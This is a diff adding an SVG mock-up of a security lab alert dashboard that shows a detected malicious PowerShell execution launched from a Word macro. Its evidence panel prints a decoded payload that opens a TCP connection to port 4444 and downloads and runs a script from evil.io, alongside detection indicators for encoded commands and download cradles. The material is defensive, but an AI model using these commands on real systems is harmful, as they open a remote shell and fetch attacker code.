@@ -1,0 +1,142 @@
+<svg viewBox="0 0 1100 700" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI',Arial,sans-serif">
+  <rect width="1100" height="700" fill="#0d1117"/>
+  <!-- Top bar -->
+  <rect width="1100" height="48" fill="#161b22"/>
+  <rect x="0" y="48" width="1100" height="1" fill="#30363d"/>
+  <text x="20" y="30" fill="#58a6ff" font-size="15" font-weight="bold">⚡ Autonomous SOC Lab</text>
+  <text x="820" y="30" fill="#8b949e" font-size="12">ElastAlert2 v2.14  |  Rules: 4 active</text>
+  <rect x="1040" y="12" width="42" height="24" rx="4" fill="#da3633"/>
+  <text x="1061" y="28" fill="#fff" font-size="11" text-anchor="middle" font-weight="bold">LIVE</text>
+
+  <!-- Alert header -->
+  <rect x="20" y="64" width="1060" height="90" rx="6" fill="#1c0f0f" stroke="#da3633" stroke-width="2"/>
+  <rect x="20" y="64" width="6" height="90" rx="3" fill="#da3633"/>
+  <!-- Severity badge -->
+  <rect x="42" y="80" width="80" height="26" rx="4" fill="#da3633"/>
+  <text x="82" y="97" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">⚠ CRITICAL</text>
+  <text x="140" y="97" fill="#ffffff" font-size="18" font-weight="bold">  Suspicious PowerShell Execution Detected</text>
+  <text x="42" y="128" fill="#8b949e" font-size="12">Alert ID: ALT-20240315-0047  |  Rule: powershell.yaml  |  Triggered: 2024-03-15 14:28:33 UTC</text>
+  <text x="900" y="97" fill="#f0883e" font-size="13" font-weight="bold">MITRE: T1059.001</text>
+  <text x="900" y="118" fill="#8b949e" font-size="11">Execution → Command Scripting</text>
+
+  <!-- Two column layout -->
+  <!-- LEFT: Event Details -->
+  <rect x="20" y="170" width="520" height="340" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+  <rect x="20" y="170" width="520" height="36" rx="6" fill="#21262d"/>
+  <text x="40" y="193" fill="#ffffff" font-size="14" font-weight="bold">📋  Event Details</text>
+
+  <text x="40" y="228" fill="#8b949e" font-size="12">Source Host</text>
+  <text x="200" y="228" fill="#e6edf3" font-size="12">WORKSTATION-047.corp.local</text>
+
+  <text x="40" y="252" fill="#8b949e" font-size="12">Source IP</text>
+  <rect x="196" y="238" width="120" height="20" rx="3" fill="#da363330"/>
+  <text x="200" y="252" fill="#ffa198" font-size="12" font-weight="bold">192.168.1.45</text>
+
+  <text x="40" y="276" fill="#8b949e" font-size="12">User Account</text>
+  <text x="200" y="276" fill="#e6edf3" font-size="12">CORP\john.doe</text>
+
+  <text x="40" y="300" fill="#8b949e" font-size="12">Process</text>
+  <text x="200" y="300" fill="#ffa198" font-size="12">powershell.exe (PID: 4928)</text>
+
+  <text x="40" y="324" fill="#8b949e" font-size="12">Parent Process</text>
+  <text x="200" y="324" fill="#e6edf3" font-size="12">winword.exe (PID: 3712)</text>
+
+  <text x="40" y="348" fill="#8b949e" font-size="12">Event ID</text>
+  <text x="200" y="348" fill="#e6edf3" font-size="12">Sysmon EventID 1 (Process Create)</text>
+
+  <text x="40" y="372" fill="#8b949e" font-size="12">Index</text>
+  <text x="200" y="372" fill="#e6edf3" font-size="12">logs-2024-03-15</text>
+
+  <text x="40" y="396" fill="#8b949e" font-size="12">Severity Score</text>
+  <rect x="196" y="382" width="180" height="16" rx="2" fill="#21262d"/>
+  <rect x="196" y="382" width="162" height="16" rx="2" fill="#da3633" opacity="0.8"/>
+  <text x="200" y="395" fill="#fff" font-size="11">9.0 / 10</text>
+
+  <text x="40" y="420" fill="#8b949e" font-size="12">Status</text>
+  <rect x="196" y="408" width="70" height="18" rx="3" fill="#1f6feb"/>
+  <text x="231" y="420" fill="#fff" font-size="11" text-anchor="middle">OPEN</text>
+
+  <text x="40" y="452" fill="#8b949e" font-size="12">Assigned To</text>
+  <text x="200" y="452" fill="#e6edf3" font-size="12">Auto → StackStorm SOAR</text>
+
+  <text x="40" y="476" fill="#8b949e" font-size="12">Escalated</text>
+  <text x="200" y="476" fill="#3fb950" font-size="12">✔  IRIS Case #IRN-2024-0089 Created</text>
+
+  <!-- RIGHT: Command Evidence -->
+  <rect x="556" y="170" width="524" height="340" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+  <rect x="556" y="170" width="524" height="36" rx="6" fill="#21262d"/>
+  <text x="576" y="193" fill="#ffffff" font-size="14" font-weight="bold">🔍  Command Evidence</text>
+
+  <text x="576" y="228" fill="#8b949e" font-size="12">Raw Command Line:</text>
+  <rect x="576" y="235" width="484" height="50" rx="4" fill="#0d1117" stroke="#da363360" stroke-width="1"/>
+  <text x="586" y="255" fill="#ffa198" font-size="10" font-family="monospace">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</text>
+  <text x="586" y="272" fill="#ffa198" font-size="10" font-family="monospace">  -NonInteractive -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0A...</text>
+
+  <text x="576" y="308" fill="#8b949e" font-size="12">Decoded Payload:</text>
+  <rect x="576" y="315" width="484" height="70" rx="4" fill="#0d1117" stroke="#da363360" stroke-width="1"/>
+  <text x="586" y="333" fill="#d2a8ff" font-size="10" font-family="monospace">$client = New-Object System.Net.Sockets.TCPClient('10.0.0.99',4444);</text>
+  <text x="586" y="350" fill="#d2a8ff" font-size="10" font-family="monospace">$stream = $client.GetStream();</text>
+  <text x="586" y="367" fill="#d2a8ff" font-size="10" font-family="monospace">IEX (New-Object Net.WebClient).DownloadString('http://evil.io/sh.ps1')</text>
+
+  <text x="576" y="408" fill="#8b949e" font-size="12">Detection Indicators:</text>
+  <rect x="576" y="414" width="230" height="22" rx="3" fill="#2d1b0e"/>
+  <text x="586" y="429" fill="#f0883e" font-size="11">⚠  -EncodedCommand flag</text>
+  <rect x="576" y="440" width="230" height="22" rx="3" fill="#2d1b0e"/>
+  <text x="586" y="455" fill="#f0883e" font-size="11">⚠  IEX (Invoke-Expression)</text>
+  <rect x="576" y="466" width="230" height="22" rx="3" fill="#2d1b0e"/>
+  <text x="586" y="481" fill="#f0883e" font-size="11">⚠  DownloadString (cradle)</text>
+  <rect x="576" y="492" width="230" height="22" rx="3" fill="#1a2d1a"/>
+  <text x="586" y="507" fill="#3fb950" font-size="11">✔  Parent: winword.exe (macro)</text>
+
+  <!-- Timeline -->
+  <rect x="20" y="526" width="1060" height="150" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+  <rect x="20" y="526" width="1060" height="36" rx="6" fill="#21262d"/>
+  <text x="40" y="549" fill="#ffffff" font-size="14" font-weight="bold">⏱  Attack Timeline</text>
+
+  <!-- Timeline events -->
+  <circle cx="80" cy="600" r="8" fill="#f0883e"/>
+  <line x1="88" y1="600" x2="220" y2="600" stroke="#30363d" stroke-width="2" stroke-dasharray="4,3"/>
+  <circle cx="228" cy="600" r="8" fill="#da3633"/>
+  <line x1="236" y1="600" x2="400" y2="600" stroke="#30363d" stroke-width="2" stroke-dasharray="4,3"/>
+  <circle cx="408" cy="600" r="8" fill="#da3633"/>
+  <line x1="416" y1="600" x2="600" y2="600" stroke="#30363d" stroke-width="2" stroke-dasharray="4,3"/>
+  <circle cx="608" cy="600" r="8" fill="#3fb950"/>
+  <line x1="616" y1="600" x2="800" y2="600" stroke="#30363d" stroke-width="2" stroke-dasharray="4,3"/>
+  <circle cx="808" cy="600" r="8" fill="#3fb950"/>
+  <line x1="816" y1="600" x2="980" y2="600" stroke="#30363d" stroke-width="2" stroke-dasharray="4,3"/>
+  <circle cx="988" cy="600" r="8" fill="#58a6ff"/>
+
+  <text x="80" y="575" fill="#8b949e" font-size="10" text-anchor="middle">14:28:01</text>
+  <text x="80" y="620" fill="#e6edf3" font-size="10" text-anchor="middle">Word Doc</text>
+  <text x="80" y="633" fill="#e6edf3" font-size="10" text-anchor="middle">Opened</text>
+
+  <text x="228" y="575" fill="#8b949e" font-size="10" text-anchor="middle">14:28:14</text>
+  <text x="228" y="620" fill="#ffa198" font-size="10" text-anchor="middle">Macro</text>
+  <text x="228" y="633" fill="#ffa198" font-size="10" text-anchor="middle">Executed</text>
+
+  <text x="408" y="575" fill="#8b949e" font-size="10" text-anchor="middle">14:28:33</text>
+  <text x="408" y="620" fill="#ffa198" font-size="10" text-anchor="middle">PS Encoded</text>
+  <text x="408" y="633" fill="#ffa198" font-size="10" text-anchor="middle">Cmd Run</text>
+
+  <text x="608" y="575" fill="#8b949e" font-size="10" text-anchor="middle">14:28:35</text>
+  <text x="608" y="620" fill="#3fb950" font-size="10" text-anchor="middle">ElastAlert2</text>
+  <text x="608" y="633" fill="#3fb950" font-size="10" text-anchor="middle">Detected</text>
+
+  <text x="808" y="575" fill="#8b949e" font-size="10" text-anchor="middle">14:28:36</text>
+  <text x="808" y="620" fill="#3fb950" font-size="10" text-anchor="middle">StackStorm</text>
+  <text x="808" y="633" fill="#3fb950" font-size="10" text-anchor="middle">Triggered</text>
+
+  <text x="988" y="575" fill="#8b949e" font-size="10" text-anchor="middle">14:28:38</text>
+  <text x="988" y="620" fill="#58a6ff" font-size="10" text-anchor="middle">IRIS Case</text>
+  <text x="988" y="633" fill="#58a6ff" font-size="10" text-anchor="middle">Created</text>
+
+  <!-- Action buttons -->
+  <rect x="20" y="686" width="110" height="28" rx="4" fill="#da3633"/>
+  <text x="75" y="704" fill="#fff" font-size="12" font-weight="bold" text-anchor="middle">🔒 Isolate Host</text>
+  <rect x="145" y="686" width="110" height="28" rx="4" fill="#f0883e"/>
+  <text x="200" y="704" fill="#fff" font-size="12" font-weight="bold" text-anchor="middle">🔍 Hunt Now</text>
+  <rect x="270" y="686" width="120" height="28" rx="4" fill="#1f6feb"/>
+  <text x="330" y="704" fill="#fff" font-size="12" font-weight="bold" text-anchor="middle">📂 Open Case</text>
+  <rect x="405" y="686" width="100" height="28" rx="4" fill="#21262d" stroke="#30363d" stroke-width="1"/>
+  <text x="455" y="704" fill="#8b949e" font-size="12" text-anchor="middle">✓ Acknowledge</text>
+</svg>
